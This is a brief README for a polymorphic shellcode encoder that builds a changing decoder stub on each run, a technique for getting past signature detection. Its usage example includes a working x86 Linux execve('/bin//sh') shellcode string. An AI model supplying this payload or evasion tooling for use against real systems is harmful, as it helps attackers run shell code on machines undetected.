polymorph-that-shell
====================


Polymorph-that-shell is a simple polymorphic engine to dynamically encode (Insertion-Encoder) shellcode. Therefore "everytime" the decoder stub is created in another way (polymorph).

Usage: ./polymorphThatShell.sh <shellcode_in_c_format>

e.g.: ./polymorphThatShell.sh "\x31\xc0\xb0\x0b\x31\xdb\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x8d\x54\x24\x08\x8d\x4c\x24\x08\xcd\x80"
